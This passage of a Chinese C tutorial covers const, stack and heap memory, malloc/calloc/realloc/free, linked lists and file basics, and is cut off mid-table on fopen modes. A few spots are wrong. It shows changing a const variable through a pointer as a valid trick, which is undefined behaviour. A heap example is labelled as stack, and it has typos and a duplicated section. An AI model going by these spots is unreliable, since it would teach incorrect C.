<span class="hljs-type">double</span> j=Pi; <span class="hljs-comment">//没有内存分配</span>
<span class="hljs-type">double</span> J=PI; <span class="hljs-comment">//再进行宏替换,又一次分配内存! const定义常量从汇编的角度来看,只是给出了对应的内存地址,而不是象#define一样给出的是立即数,所以,const定义的常量在程序运行过程中只有一份拷贝,而#define定义的常量在内存 中有若干个拷贝。</span></code></pre>
<ul>
<li>(6) 􏰀高了效率。编译器通常不为普通const常量分配存储空间,而是将它们保存在符号表 中,这使得它成为一个编译期间的常量,没有了存储与读内存的操作,使得它的效率也很高。</li>
</ul>
<h2 id="如何使用const">如何使用const?</h2>
<ul>
<li>(1)修饰一般常量一般常量是指简单类型的常量。这种常量在定义时,修饰符const可以用在类型说明符前,也可以用在类型说明符后</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-type">const</span> x=<span class="hljs-number">2</span>; 或 <span class="hljs-type">const</span> <span class="hljs-type">int</span> x=<span class="hljs-number">2</span>;</code></pre>
<ul>
<li>(当然,我们可以偷梁换柱进行更新: 通过强制类型转换,将地址赋给变量,再作修改即可以改变const常量值。)</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// const对于基本数据类型, 无论写在左边还是右边, 变量中的值不能改变</span>
<span class="hljs-type">const</span> <span class="hljs-type">int</span> a = <span class="hljs-number">5</span>;
<span class="hljs-comment">// a = 666; // 直接修改会报错</span>
<span class="hljs-comment">// 偷梁换柱, 利用指针指向变量</span>
<span class="hljs-type">int</span> *p;
p = &amp;a;
<span class="hljs-comment">// 利用指针间接修改变量中的值</span>
*p = <span class="hljs-number">10</span>;
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, a); 
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, *p);</code></pre>
<ul>
<li>(2)修饰常数组(值不能够再改变了)定义或说明一个常数组可采用如下格式:</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-type">const</span> a[<span class="hljs-number">5</span>]=&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;
<span class="hljs-type">const</span> <span class="hljs-type">int</span> a[<span class="hljs-number">5</span>]=&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;</code></pre>
<pre><code class="hljs plaintext">const int a[5]=&#123;1, 2, 3, 4, 5&#125;;
a[1] = 55; // 错误</code></pre>
<ul>
<li>(3)修饰函数的常参数const修饰符也可以修饰函数的传递参数,格式如下:void Fun(const int Var); 告诉编译器Var在函数体中的无法改变,从而防止了使用者的一些无 意的或错误的修改。</li>
<li>(4)修饰函数的返回值: const修饰符也可以修饰函数的返回值,是返回值不可被改变,格式如 下:</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">int</span> <span class="hljs-title function_">Fun1</span><span class="hljs-params">()</span>;
<span class="hljs-type">const</span> MyClass <span class="hljs-title function_">Fun2</span><span class="hljs-params">()</span>;</code></pre>
<ul>
<li>(5)修饰常指针
<ul>
<li>const int *A; //const修饰指针,A可变,A指向的值不能被修改</li>
<li>int const *A; //const修饰指向的对象,A可变,A指向的对象不可变</li>
<li>int *const A; //const修饰指针A, A不可变,A指向的对象可变</li>
<li>const int *const A;//指针A和A指向的对象都不可变</li>
</ul>
</li>
<li>技巧</li>
</ul>
<pre><code class="hljs plaintext">先看“*”的位置
如果const 在 *的左侧 表示值不能修改,但是指向可以改。
如果const 在 *的右侧 表示指向不能改,但是值可以改
如果在“*”的两侧都有const 标识指向和值都不能改。</code></pre>
<h2 id="内存管理">内存管理</h2>
<h2 id="进程空间">进程空间</h2>
<ul>
<li>程序，是经源码编译后的可执行文件，可执行文件可以多次被执行，比如我们可以多次打开 office。</li>
<li>而进程，是程序加载到内存后开始执行，至执行结束，这样一段时间概念，多次打开的wps,每打开一次都是一个进程，当我们每关闭一个 office，则表示该进程结束。</li>
<li>程序是静态概念，而进程动态/时间概念。<br>
###进程空间图示<br>
有了进程和程序的概念以后，我们再来看一下，程序被加载到内存以后内存空间布局是什么样的<br>
<img src="https://img-blog.csdnimg.cn/img_convert/47ab2c9972b514404bb4b00bb29df02e.png" alt="img"></li>
</ul>
<hr>
<h2 id="栈内存stack">栈内存(Stack)</h2>
<ul>
<li>栈中存放任意类型的变量，但必须是 auto 类型修饰的，即自动类型的局部变量， 随用随开，用完即消。</li>
<li>内存的分配和销毁系统自动完成，不需要人工干预</li>
<li>栈的最大尺寸固定，超出则引起栈溢出
<ul>
<li>局部变量过多，过大 或 递归层数太多等就会导致栈溢出</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">int ages[10240*10240]; // 程序会崩溃, 栈溢出</code></pre>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

int main()
&#123;
    // 存储在栈中, 内存地址从大到小
    int a = 10;
    int b = 20;
    printf(&quot;&amp;a = %p\n&quot;, &amp;a); // &amp;a = 0060FEAC
    printf(&quot;&amp;b = %p\n&quot;, &amp;b); // &amp;b = 0060FEA8

    return 0;
&#125;</code></pre>
<h2 id="堆内存heap">堆内存(Heap)</h2>
<ul>
<li>堆内存可以存放任意类型的数据，但需要自己申请与释放</li>
<li>堆大小，想像中的无穷大，但实际使用中，受限于实际内存的大小和内存是否连续性</li>
</ul>
<pre><code class="hljs plaintext">int *p = (int *)malloc(10240 * 1024); // 不一定会崩溃</code></pre>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()
&#123;
    // 存储在栈中, 内存地址从小到大
    int *p1 = malloc(4);
    *p1 = 10;
    int *p2 = malloc(4);
    *p2 = 20;
   
    printf(&quot;p1 = %p\n&quot;, p1); //  p1 = 00762F48
    printf(&quot;p2 = %p\n&quot;, p2); // p2 = 00762F58

    return 0;
&#125;</code></pre>
<h2 id="malloc函数">malloc函数</h2>
<table>
<thead>
<tr>
<th style="text-align:center"><strong>函数声明</strong></th>
<th style="text-align:center"><strong>void * malloc(size_t _Size);</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">所在文件</td>
<td style="text-align:center">stdlib.h</td>
</tr>
<tr>
<td style="text-align:center">函数功能</td>
<td style="text-align:center">申请堆内存空间并返回,所申请的空间并未初始化。</td>
</tr>
<tr>
<td style="text-align:center">常见的初始化方法是</td>
<td style="text-align:center">memset 字节初始化。</td>
</tr>
<tr>
<td style="text-align:center">参数及返回解析</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">参数</td>
<td style="text-align:center">size_t _size 表示要申请的字符数</td>
</tr>
<tr>
<td style="text-align:center">返回值</td>
<td style="text-align:center">void * 成功返回非空指针指向申请的空间 ，失败返回 NULL</td>
</tr>
</tbody>
</table>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main()
&#123;
    /*
     * malloc
     * 第一个参数: 需要申请多少个字节空间
     * 返回值类型: void *
     */ 
    int *p = (int *)malloc(sizeof(int));
    printf(&quot;p = %i\n&quot;, *p); // 保存垃圾数据
    /*
     * 第一个参数: 需要初始化的内存地址
     * 第二个初始: 需要初始化的值
     * 第三个参数: 需要初始化对少个字节
     */ 
    memset(p, 0, sizeof(int)); // 对申请的内存空间进行初始化
    printf(&quot;p = %i\n&quot;, *p); // 初始化为0
    return 0;
&#125;</code></pre>
<h2 id="free函数">free函数</h2>
<ul>
<li>注意: 通过malloc申请的存储空间一定要释放, 所以malloc和free函数总是成对出现</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center"><strong>函数声明</strong></th>
<th style="text-align:center"><strong>void free(void *p);</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">所在文件</td>
<td style="text-align:center">stdlib.h</td>
</tr>
<tr>
<td style="text-align:center">函数功能</td>
<td style="text-align:center">释放申请的堆内存</td>
</tr>
<tr>
<td style="text-align:center">参数及返回解析</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">参数</td>
<td style="text-align:center">void* p 指向手动申请的空间</td>
</tr>
<tr>
<td style="text-align:center">返回值</td>
<td style="text-align:center">void 无返回</td>
</tr>
</tbody>
</table>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main()
&#123;
    // 1.申请4个字节存储空间
    int *p = (int *)malloc(sizeof(int));
    // 2.初始化4个字节存储空间为0
    memset(p, 0, sizeof(int));
    // 3.释放申请的存储空间
    free(p);
    return 0;
&#125;</code></pre>
<h2 id="calloc函数">calloc函数</h2>
<table>
<thead>
<tr>
<th style="text-align:center">函数声明</th>
<th style="text-align:center"><strong>void *calloc(size_t nmemb, size_t size);</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">所在文件</td>
<td style="text-align:center">stdlib.h</td>
</tr>
<tr>
<td style="text-align:center">函数功能</td>
<td style="text-align:center">申请堆内存空间并返回，所申请的空间，自动清零</td>
</tr>
<tr>
<td style="text-align:center">参数及返回解析</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">参数</td>
<td style="text-align:center">size_t nmemb 所需内存单元数量</td>
</tr>
<tr>
<td style="text-align:center">参数</td>
<td style="text-align:center">size_t size 内存单元字节数量</td>
</tr>
<tr>
<td style="text-align:center">返回值</td>
<td style="text-align:center">void * 成功返回非空指针指向申请的空间 ，失败返回 NULL</td>
</tr>
</tbody>
</table>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main()
&#123;
    /*
    // 1.申请3块4个字节存储空间
    int *p = (int *)malloc(sizeof(int) * 3);
    // 2.使用申请好的3块存储空间
    p[0] = 1;
    p[1] = 3;
    p[2] = 5;
    printf(&quot;p[0] = %i\n&quot;, p[0]);
    printf(&quot;p[1] = %i\n&quot;, p[1]);
    printf(&quot;p[2] = %i\n&quot;, p[2]);
    // 3.释放空间
    free(p);
    */

    // 1.申请3块4个字节存储空间
    int *p = calloc(3, sizeof(int));
    // 2.使用申请好的3块存储空间
    p[0] = 1;
    p[1] = 3;
    p[2] = 5;
    printf(&quot;p[0] = %i\n&quot;, p[0]);
    printf(&quot;p[1] = %i\n&quot;, p[1]);
    printf(&quot;p[2] = %i\n&quot;, p[2]);
    // 3.释放空间
    free(p);

    return 0;
&#125;</code></pre>
<h2 id="realloc函数">realloc函数</h2>
<table>
<thead>
<tr>
<th style="text-align:center"><strong>函数声明</strong></th>
<th style="text-align:center"><strong>oid *realloc(void *ptr, size_t size);</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">所在文件</td>
<td style="text-align:center">stdlib.h</td>
</tr>
<tr>
<td style="text-align:center">函数功能</td>
<td style="text-align:center">扩容(缩小)原有内存的大小。通常用于扩容，缩小会会导致内存缩去的部分数据丢失</td>
</tr>
<tr>
<td style="text-align:center">参数及返回解析</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">参数</td>
<td style="text-align:center">void * ptr 表示待扩容(缩小)的指针， ptr 为之前用 malloc 或者 calloc 分配的内存地址。</td>
</tr>
<tr>
<td style="text-align:center">参数</td>
<td style="text-align:center">size_t size 表示扩容(缩小)后内存的大小。</td>
</tr>
<tr>
<td style="text-align:center">返回值</td>
<td style="text-align:center">void* 成功返回非空指针指向申请的空间 ，失败返回 NULL。</td>
</tr>
</tbody>
</table>
<ul>
<li>注意点:
<ul>
<li>若参数ptr==NULL，则该函数等同于 malloc</li>
<li>返回的指针，可能与 ptr 的值相同，也有可能不同。若相同，则说明在原空间后面申请，否则，则可能后续空间不足，重新申请的新的连续空间，原数据拷贝到新空间， 原有空间自动释放</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main()
&#123;
    // 1.申请4个字节存储空间
    int *p = NULL;
    p = realloc(p, sizeof(int)); // 此时等同于malloc
    // 2.使用申请好的空间
    *p = 666;
    printf(&quot;*p = %i\n&quot;,  *p);
    // 3.释放空间
    free(p);

    return 0;
&#125;</code></pre>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main()
&#123;
    // 1.申请4个字节存储空间
    int *p = malloc(sizeof(int));
    printf(&quot;p = %p\n&quot;, p);
    // 如果能在传入存储空间地址后面扩容, 返回传入存储空间地址
    // 如果不能在传入存储空间地址后面扩容, 返回一个新的存储空间地址
    p = realloc(p, sizeof(int) * 2);
    printf(&quot;p = %p\n&quot;, p);
    // 2.使用申请好的空间
    *p = 666;
    printf(&quot;*p = %i\n&quot;,  *p);
    // 3.释放空间
    free(p);

    return 0;
&#125;</code></pre>
<h2 id="链表">链表</h2>
<ul>
<li>链表实现了，内存零碎数据的有效组织。比如，当我们用 malloc 来进行内存申请的时候，当内存足够，但是由于碎片太多，没有连续内存时，只能以申请失败而告终，而用链表这种数据结构来组织数据，就可以解决上类问题。<br>
[外链图片转存中…(img-wcaQsM5W-1648814825910)]</li>
</ul>
<h2 id="静态链表">静态链表</h2>
<p>[外链图片转存中…(img-zwaxM2zR-1648814825910)]</p>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

// 1.定义链表节点
typedef struct node&#123;
    int data;
    struct node *next;
&#125;Node;
int main()
&#123;

    // 2.创建链表节点
    Node a;
    Node b;
    Node c;

    // 3.初始化节点数据
    a.data = 1;
    b.data = 3;
    c.data = 5;

    // 4.链接节点
    a.next = &amp;b;
    b.next = &amp;c;
    c.next = NULL;

    // 5.创建链表头
    Node *head = &amp;a;

    // 6.使用链表
    while(head != NULL)&#123;
        int currentData = head-&gt;data;
        printf(&quot;currentData = %i\n&quot;, currentData);
        head = head-&gt;next;
    &#125;
    return 0;
&#125;</code></pre>
<h2 id="动态链表">动态链表</h2>
<ul>
<li>静态链表的意义不是很大，主要原因，数据存储在栈上，栈的存储空间有限，不能动态分配。所以链表要实现存储的自由，要动态的申请堆里的空间。</li>
<li>有一个点要说清楚，我们的实现的链表是带头节点。至于，为什么带头节点，需等大家对链表有个整体的的认知以后，再来体会，会更有意义。</li>
<li>空链表
<ul>
<li>头指针带了一个空链表节点, 空链表节点中的next指向NULL<br>
[外链图片转存中…(img-Avlo3vjr-1648814825910)]</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

// 1.定义链表节点
typedef struct node&#123;
    int data;
    struct node *next;
&#125;Node;
int main()
&#123;
    Node *head = createList();
    return 0;
&#125;
// 创建空链表
Node *createList()&#123;
    // 1.创建一个节点
    Node *node = (Node *)malloc(sizeof(Node));
    if(node == NULL)&#123;
        exit(-1);
    &#125;
    // 2.设置下一个节点为NULL
    node-&gt;next = NULL;
    // 3.返回创建好的节点
    return node;
&#125;</code></pre>
<p>非空链表</p>
<ul>
<li>头指针带了一个非空节点, 最后一个节点中的next指向NULL<br>
[外链图片转存中…(img-jIY1Xw5f-1648814825911)]</li>
</ul>
<h2 id="动态链表头插法">动态链表头插法</h2>
<ul>
<li>1.让新节点的下一个节点等于头结点的下一个节点</li>
<li>2.让头节点的下一个节点等于新节点</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

// 1.定义链表节点
typedef struct node&#123;
    int data;
    struct node *next;
&#125;Node;
Node *createList();
void printNodeList(Node *node);
int main()
&#123;
    Node *head = createList();
    printNodeList(head);
    return 0;
&#125;
/**
 * @brief createList 创建链表
 * @return  创建好的链表
 */
Node *createList()&#123;
    // 1.创建头节点
    Node *head = (Node *)malloc(sizeof(Node));
    if(head == NULL)&#123;
        return NULL;
    &#125;
    head-&gt;next = NULL;

    // 2.接收用户输入数据
    int num = -1;
    printf(&quot;请输入节点数据\n&quot;);
    scanf(&quot;%i&quot;, &amp;num);

    // 3.通过循环创建其它节点
    while(num != -1)&#123;
        // 3.1创建一个新的节点
        Node *cur = (Node *)malloc(sizeof(Node));
        cur-&gt;data = num;

        // 3.2让新节点的下一个节点指向头节点的下一个节点
        cur-&gt;next = head-&gt;next;
        // 3.3让头节点的下一个节点指向新节点
        head-&gt;next = cur;

        // 3.4再次接收用户输入数据
        scanf(&quot;%i&quot;, &amp;num);
    &#125;

    // 3.返回创建好的节点
    return head;
&#125;
/**
 * @brief printNodeList 遍历链表
 * @param node 链表指针头
 */
void printNodeList(Node *node)&#123;
    Node *head = node-&gt;next;
    while(head != NULL)&#123;
        int currentData = head-&gt;data;
        printf(&quot;currentData = %i\n&quot;, currentData);
        head = head-&gt;next;
    &#125;
&#125;</code></pre>
<h2 id="动态链表尾插法">动态链表尾插法</h2>
<ul>
<li>1.定义变量记录新节点的上一个节点</li>
<li>2.将新节点添加到上一个节点后面</li>
<li>3.让新节点成为下一个节点的上一个节点</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

// 1.定义链表节点
typedef struct node&#123;
    int data;
    struct node *next;
&#125;Node;
Node *createList();
void printNodeList(Node *node);
int main()
&#123;
    Node *head = createList();
    printNodeList(head);
    return 0;
&#125;
/**
 * @brief createList 创建链表
 * @return  创建好的链表
 */
Node *createList()&#123;
    // 1.创建头节点
    Node *head = (Node *)malloc(sizeof(Node));
    if(head == NULL)&#123;
        return NULL;
    &#125;
    head-&gt;next = NULL;

    // 2.接收用户输入数据
    int num = -1;
    printf(&quot;请输入节点数据\n&quot;);
    scanf(&quot;%i&quot;, &amp;num);

    // 3.通过循环创建其它节点
    // 定义变量记录上一个节点
    Node *pre = head;
    while(num != -1)&#123;
        // 3.1创建一个新的节点
        Node *cur = (Node *)malloc(sizeof(Node));
        cur-&gt;data = num;

        // 3.2让新节点链接到上一个节点后面
        pre-&gt;next = cur;
        // 3.3当前节点下一个节点等于NULL
        cur-&gt;next = NULL;
        // 3.4让当前节点编程下一个节点的上一个节点
        pre = cur;

        // 3.5再次接收用户输入数据
        scanf(&quot;%i&quot;, &amp;num);
    &#125;

    // 3.返回创建好的节点
    return head;
&#125;
/**
 * @brief printNodeList 遍历链表
 * @param node 链表指针头
 */
void printNodeList(Node *node)&#123;
    Node *head = node-&gt;next;
    while(head != NULL)&#123;
        int currentData = head-&gt;data;
        printf(&quot;currentData = %i\n&quot;, currentData);
        head = head-&gt;next;
    &#125;
&#125;</code></pre>
<h2 id="动态链优化">动态链优化</h2>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

// 1.定义链表节点
typedef struct node&#123;
    int data;
    struct node *next;
&#125;Node;
Node *createList();
void printNodeList(Node *node);
void insertNode1(Node *head, int data);
void insertNode2(Node *head, int data);
int main()
&#123;
    // 1.创建一个空链表
    Node *head = createList();
    // 2.往空链表中插入数据
    insertNode1(head, 1);
    insertNode1(head, 3);
    insertNode1(head, 5);
    printNodeList(head);
    return 0;
&#125;
/**
 * @brief createList 创建空链表
 * @return  创建好的空链表
 */
Node *createList()&#123;
    // 1.创建头节点
    Node *head = (Node *)malloc(sizeof(Node));
    if(head == NULL)&#123;
        return NULL;
    &#125;
    head-&gt;next = NULL;
    // 3.返回创建好的节点
    return head;
&#125;
/**
 * @brief insertNode1 尾插法插入节点
 * @param head 需要插入的头指针
 * @param data 需要插入的数据
 * @return  插入之后的链表
 */
void insertNode1(Node *head, int data)&#123;
    // 1.定义变量记录最后一个节点
    Node *pre = head;
    while(pre != NULL &amp;&amp; pre-&gt;next != NULL)&#123;
        pre = pre-&gt;next;
    &#125;
    // 2.创建一个新的节点
    Node *cur = (Node *)malloc(sizeof(Node));
    cur-&gt;data = data;

    // 3.让新节点链接到上一个节点后面
    pre-&gt;next = cur;
    // 4.当前节点下一个节点等于NULL
    cur-&gt;next = NULL;
    // 5.让当前节点编程下一个节点的上一个节点
    pre = cur;
&#125;
/**
 * @brief insertNode1 头插法插入节点
 * @param head 需要插入的头指针
 * @param data 需要插入的数据
 * @return  插入之后的链表
 */
void insertNode2(Node *head, int data)&#123;
    // 1.创建一个新的节点
    Node *cur = (Node *)malloc(sizeof(Node));
    cur-&gt;data = data;

    // 2.让新节点的下一个节点指向头节点的下一个节点
    cur-&gt;next = head-&gt;next;
    // 3.让头节点的下一个节点指向新节点
    head-&gt;next = cur;
&#125;
/**
 * @brief printNodeList 遍历链表
 * @param node 链表指针头
 */
void printNodeList(Node *node)&#123;
    Node *head = node-&gt;next;
    while(head != NULL)&#123;
        int currentData = head-&gt;data;
        printf(&quot;currentData = %i\n&quot;, currentData);
        head = head-&gt;next;
    &#125;
&#125;</code></pre>
<h2 id="链表销毁">链表销毁</h2>
<pre><code class="hljs plaintext">/**
 * @brief destroyList 销毁链表
 * @param head 链表头指针
 */
void destroyList(Node *head)&#123;
    Node *cur = NULL;
    while(head != NULL)&#123;
        cur = head-&gt;next;
        free(head);
        head = cur;
    &#125;
&#125;</code></pre>
<h2 id="链表长度计算">链表长度计算</h2>
<pre><code class="hljs plaintext">/**
 * @brief listLength 计算链表长度
 * @param head 链表头指针
 * @return 链表长度
 */
int listLength(Node *head)&#123;
    int count = 0;
    head = head-&gt;next;
    while(head)&#123;
       count++;
       head = head-&gt;next;
    &#125;
    return count;
&#125;</code></pre>
<h2 id="链表查找">链表查找</h2>
<pre><code class="hljs plaintext">/**
 * @brief searchList 查找指定节点
 * @param head 链表头指针
 * @param key 需要查找的值
 * @return
 */
Node *searchList(Node *head, int key)&#123;
    head = head-&gt;next;
    while(head)&#123;
        if(head-&gt;data == key)&#123;
            break;
        &#125;else&#123;
            head = head-&gt;next;
        &#125;
    &#125;
    return head;
&#125;</code></pre>
<h2 id="链表查找">链表查找</h2>
<pre><code class="hljs plaintext">/**
 * @brief searchList 查找指定节点
 * @param head 链表头指针
 * @param key 需要查找的值
 * @return
 */
Node *searchList(Node *head, int key)&#123;
    head = head-&gt;next;
    while(head)&#123;
        if(head-&gt;data == key)&#123;
            break;
        &#125;else&#123;
            head = head-&gt;next;
        &#125;
    &#125;
    return head;
&#125;</code></pre>
<h2 id="链表删除">链表删除</h2>
<pre><code class="hljs plaintext">void deleteNodeList(Node *head, Node *find)&#123;
    while(head-&gt;next != find)&#123;
        head = head-&gt;next;
    &#125;
    head-&gt;next = find-&gt;next;
    free(find);
&#125;</code></pre>
<h2 id="作业">作业</h2>
<ul>
<li>给链表排序</li>
</ul>
<pre><code class="hljs plaintext">/**
 * @brief bubbleSort 对链表进行排序
 * @param head 链表头指针
 */
void bubbleSort(Node *head)&#123;
    // 1.计算链表长度
    int len = listLength(head);
    // 2.定义变量记录前后节点
    Node *cur = NULL;
   // 3.相邻元素进行比较, 进行冒泡排序
    for(int i = 0; i &lt; len - 1; i++)&#123;
        cur = head-&gt;next;
        for(int j = 0; j &lt; len - 1 - i; j++)&#123;
            printf(&quot;%i, %i\n&quot;, cur-&gt;data, cur-&gt;next-&gt;data);
            if((cur-&gt;data) &gt; (cur-&gt;next-&gt;data))&#123;
                int temp = cur-&gt;data;
                cur-&gt;data = cur-&gt;next-&gt;data;
                cur-&gt;next-&gt;data = temp;
            &#125;
            cur = cur-&gt;next;
        &#125;
    &#125;
&#125;</code></pre>
<pre><code class="hljs plaintext">/**
 * @brief sortList 对链表进行排序
 * @param head 链表头指针
 */
void sortList(Node *head)&#123;
    // 0.计算链表长度
    int len = listLength(head);
    // 1.定义变量保存前后两个节点
    Node *sh, *pre, *cur;
    for(int i = 0; i &lt; len - 1; i ++)&#123;
        sh = head; // 头节点
        pre = sh-&gt;next; // 第一个节点
        cur = pre-&gt;next; // 第二个节点
        for(int j = 0; j &lt; len - 1 - i; j++)&#123;
            if(pre-&gt;data &gt; cur-&gt;data)&#123;
                // 交换节点位置
                sh-&gt;next = cur;
                pre-&gt;next = cur-&gt;next;
                cur-&gt;next = pre;
                // 恢复节点名称
                Node *temp = pre;
                pre = cur;
                cur = temp;
            &#125;
            // 让所有节点往后移动
            sh = sh-&gt;next;
            pre = pre-&gt;next;
            cur = cur-&gt;next;
        &#125;
    &#125;
&#125;</code></pre>
<ul>
<li>链表反转</li>
</ul>
<pre><code class="hljs plaintext">/**
 * @brief reverseList 反转链表
 * @param head 链表头指针
 */
void reverseList(Node *head)&#123;
    // 1.将链表一分为二
    Node *pre, *cur;
    pre = head-&gt;next;
    head-&gt;next = NULL;
    // 2.重新插入节点
    while(pre)&#123;
        cur = pre-&gt;next;
        pre-&gt;next = head-&gt;next;
        head-&gt;next = pre;

        pre = cur;
    &#125;
&#125;</code></pre>
<h2 id="文件基本概念">文件基本概念</h2>
<ul>
<li>文件流:
<ul>
<li>C 语言把文件看作是一个字符的序列，即文件是由一个一个字符组成的字符流，因此 c 语言将文件也称之为文件流。</li>
</ul>
</li>
<li>文件分类
<ul>
<li>文本文件
<ul>
<li>以 ASCII 码格式存放，<strong>一个字节存放一个字符</strong>。<code>文本文件的每一个字节存放一个 ASCII 码，代表一个字符</code>。这便于对字符的逐个处理，但占用存储空间<br>
较多，而且要花费时间转换。</li>
<li>.c文件就是以文本文件形式存放的</li>
</ul>
</li>
<li>二进制文件
<ul>
<li>以补码格式存放。二进制文件是把数据以二进制数的格式存放在文件中的，其占用存储空间较少。<code>数据按其内存中的存储形式原样存放</code></li>
<li>.exe文件就是以二进制文件形式存放的</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>文本文件和二进制文件示例
<ul>
<li>下列代码暂时不要求看懂, 主要理解什么是文本文件什么是二进制文件</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

int main()
&#123;
    /*
     * 以文本形式存储
     * 会将每个字符先转换为对应的ASCII,
     * 然后再将ASCII码的二进制存储到计算机中
     */
    int num = 666;
    FILE *fa = fopen(&quot;ascii.txt&quot;, &quot;w&quot;);
    fprintf(fa, &quot;%d&quot;, num);
    fclose(fa);

    /*
     * 以二进制形式存储
     * 会将666的二进制直接存储到文件中
     */
    FILE *fb = fopen(&quot;bin.txt&quot;, &quot;w&quot;);
    fwrite(&amp;num, 4, 1, fb);
    fclose(fb);

    return 0;
&#125;</code></pre>
<ul>
<li>内存示意图<br>
<img src="https://img-blog.csdnimg.cn/img_convert/a989b57283bdbcd82ae8bfb0c6fb4b8d.png" alt="img"></li>
<li>通过文本工具打开示意图<br>
[外链图片转存中…(img-U0dBDJz0-1648814825912)]</li>
</ul>
<blockquote>
<ul>
<li>文本工具默认会按照ASCII码逐个直接解码文件, 由于文本文件存储的就是ASCII码, 所以可以正常解析显示, 由于二进制文件存储的不是ASCII码, 所以解析出来之后是乱码</li>
</ul>
</blockquote>
<h2 id="文件的打开和关闭">文件的打开和关闭</h2>
<ul>
<li>FILE 结构体
<ul>
<li>FILE 结构体是对缓冲区和文件读写状态的记录者，所有对文件的操作，都是通过FILE 结构体完成的。</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">struct _iobuf &#123;
  char *_ptr;  //文件输入的下一个位置
  int _cnt;  //当前缓冲区的相对位置
  char *_base; //文件的起始位置)
  int _flag; //文件标志
  int _file;  //文件的有效性验证
  int _charbuf; //检查缓冲区状况,如果无缓冲区则不读取
  int _bufsiz; // 缓冲区大小
  char *_tmpfname; //临时文件名
&#125;;
typedef struct _iobuf FILE;</code></pre>
<ul>
<li>fileopen函数</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center"><strong>函数声明</strong></th>
<th style="text-align:center"><strong>FILE * fopen ( const char * filename, const char * mode );</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">所在文件</td>
<td style="text-align:center">stdio.h</td>
</tr>
<tr>
<td style="text-align:center">函数功能</td>
<td style="text-align:center">以 mode 的方式，打开一个 filename 命名的文件，返回一个指向该文件缓冲的 FILE 结构体指针。</td>
</tr>
<tr>
<td style="text-align:center">参数及返回解析</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">参数</td>
<td style="text-align:center">char*filaname :要打开，或是创建文件的路径。</td>
</tr>
<tr>
<td style="text-align:center">参数</td>
<td style="text-align:center">char*mode :打开文件的方式。</td>
</tr>
<tr>
<td style="text-align:center">返回值</td>
<td style="text-align:center">FILE* 返回指向文件缓冲区的指针，该指针是后序操作文件的句柄。</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th style="text-align:center"><strong>mode</strong></th>
<th style="text-align:center"><strong>处理方式</strong></th>
<th style="text-align:center"><strong>当文件不存在时</strong></th>
<th style="text-align:center"><strong>当文件存在时</strong></th>
<th style="text-align:center"><strong>向文件输入</strong></th>
<th style="text-align:center"><strong>从文件输出</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">r</td>
<td style="text-align:center">读取</td>
<td style="text-align:center">出错</td>
<td style="text-align:center">打开文件</td>
<td style="text-align:center">不能</td>
<td style="text-align:center">可以</td>
</tr>
<tr>
<td style="text-align:center">w</td>
<td style="text-align:center">写入</td>
<td style="text-align:center">建立新文件</td>
<td style="text-align:center">覆盖原有文件</td>
<td style="text-align:center">可以</td>
<td style="text-align:center">不能</td>
</tr>
<tr>
<td style="text-align:center">a</td>
<td style="text-align:center">追加</td>
<td style="text-align:center">建立新文件</td>
<td style="text-align:center">在原有文件后追加</td>
<td style="text-align:center">可以</td>
<td style="text-align:center">不能</td>
</tr>
<tr>
<td style="text-align:center">r+</td>
<td style="text-align:center">读取/写入</td>
<td style="text-align:center">出错</td>
